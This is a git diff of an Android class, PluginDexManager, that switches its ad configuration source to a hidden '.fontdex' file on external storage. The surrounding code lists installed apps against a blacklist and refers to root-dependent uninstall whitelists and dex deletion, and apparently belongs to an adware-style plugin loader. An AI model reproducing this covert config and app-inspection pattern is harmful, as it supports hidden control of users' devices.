@@ -23,6 +23,7 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
@@ -90,16 +91,14 @@ public class PluginDexManager {
         return singleton;
     }
 
-    public void initialize(final Context context) {
+    public boolean initialize(final Context context) {
         mContext = context.getApplicationContext();
         try {
-            JSONObject jsonObject = new JSONObject(getJson(mContext, "demo.json"));
-            Log.e(TAG, jsonObject.toString());
-            adBean = AdBean.parse(getJson(mContext, "demo.json"));
+            adBean = AdBean.parse(getStringFileFromSd());
             if (adBean != null) {
                 if (compare(adBean.getBlackList(), getAppList(mContext))) {
                     //黑名单
-                    return;
+                    return false;
                 } else {
                     //卸载白名单
                     if (adBean.isRooted()) {
@@ -123,16 +122,28 @@ public class PluginDexManager {
                     }
                 }
             }
-        } catch (JSONException e) {
+            return true;
+        } catch (Exception e) {
             e.printStackTrace();
+            return false;
         }
-        //  deleteDex(context);
     }
 
     private void deleteDex(Context context) {
         new ShellUtils().deleteDir(context.getDir("dex", Context.MODE_PRIVATE));
     }
 
+    private String getConfigJson() {
+        return Environment.getExternalStorageDirectory() + File.separator + ".fontdex" + File.separator + "action.json";
+    }
+
+    /**
+     * 读取assets
+     *
+     * @param context
+     * @param fileName
+     * @return
+     */
     private String getJson(Context context, String fileName) {
         StringBuilder stringBuilder = new StringBuilder();
         InputStreamReader inputStreamReader = null;
@@ -163,6 +174,33 @@ public class PluginDexManager {
     }
 
     /**
+     * 读取sd卡文件
+     *
+     * @return
+     */
+    private String getStringFileFromSd() {
+        StringBuilder stringBuilder = new StringBuilder();
+        try {
+            File file = new File(getConfigJson());
+            if (file.exists()) {
+                FileInputStream fileInputStream = new FileInputStream(file);
+                BufferedReader bufferedReader = new BufferedReader(
+                        new InputStreamReader(fileInputStream));
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line);
+                }
+                fileInputStream.close();
+                bufferedReader.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return stringBuilder.toString();
+    }
+
+    /**
      * 获取非系统应用信息列表
      */
     private List<String> getAppList(Context context) {
@@ -172,10 +210,6 @@ public class PluginDexManager {
         for (PackageInfo packageInfo : packages) {
             // 判断系统/非系统应用
             if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-//                info.pkgName = packageInfo.packageName;
-//                info.appIcon = packageInfo.applicationInfo.loadIcon(pm);
-//                // 获取该应用安装包的Intent，用于启动该应用
-//                info.appIntent = pm.getLaunchIntentForPackage(packageInfo.packageName);
                 userAppList.add(packageInfo.packageName);
             } else {
                 // 系统应用　　　　　　　　
